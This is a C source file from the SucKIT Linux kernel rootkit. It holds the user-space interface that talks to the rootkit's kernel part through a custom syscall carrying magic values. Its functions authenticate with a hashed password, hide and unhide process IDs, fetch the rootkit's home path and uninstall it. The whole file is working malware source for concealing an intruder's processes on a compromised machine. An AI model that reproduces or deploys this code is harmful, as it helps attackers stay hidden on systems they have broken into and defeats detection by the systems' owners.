/*
 * $Id: aux.c, kernel <=> user pool
 */

#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <signal.h>

#include "sktypes.h"
#include "sk.h"
#include "aux.h"
#include "sha1.h"

/* global aux status */
sk_aux aux;

static inline _syscall4(int, skaux, sk_aux *, aux, int, cmd, ulong, magic1, ulong, magic2);

ulong	kpass[5];

/* interface between kernel <> user */
int	sk_io(int cmd)
{
	int i;

	aux.cmd = cmd;
	aux.ret = 0;
	i = skaux(&aux, aux.cmd, kpass[0], kpass[1]);
	if (i == CMD_COMPLETED) {
		return aux.ret;
	}
	return -1;
}

/* force kernel to recognize us */
int	sk_auth(char *pass)
{
	sha1_asm((void *) kpass, pass, strlen(pass));
	aux.arg = (ulong) pass;
	return sk_io(CMD_AUTH);
}

/* NULL if not, otherwise str pointing to version */
char	*authenticated(void)
{
	static char verbuf[256];
	aux.arg = (ulong) verbuf;
	return (sk_io(CMD_GETVER) < 0)?NULL:verbuf;
}

char	*get_khome(void)
{
	static char buf[1024];
	aux.arg = (ulong) buf;
	return (sk_io(CMD_GETHOME) < 0)?NULL:buf;
}

int	uninstall(void)
{
	int	pid, status = 0;

	pid = fork();

	if (!pid) {
		_exit(sk_io(CMD_UNINST));
	}
	waitpid(pid, &status, 0);

	if (status) {
		eprintf("Failed to uninstall suckit! (0x%x)\n", status);
		return 1;
	}
	eprintf("Suckit uninstalled sucesfully!\n");
	return 0;
}

int	hide_pid(int pid)
{
	if (kill(pid, 0) && (errno == ESRCH)) {
		eprintf("Warning: %d imho doesn't exists\n"
			"however, i'll hide it in future ;)\n", pid);
	}
	aux.arg = pid;
	if (sk_io(CMD_HIDE) < 0) {
		eprintf("Can't hide %d\n", pid);
		return 1;
	} else {
		eprintf("Pid %d hidden\n", pid);
		return 0;
	}
}

int	unhide_pid(int pid)
{
	aux.arg = pid;
	if (sk_io(CMD_UNHIDE) < 0) {
		eprintf("Can't make %d visible (not found ?)!\n", pid);
		return 1;
	} else {
		eprintf("Process %d is visible now!\n", pid);
		return 0;
	}
}

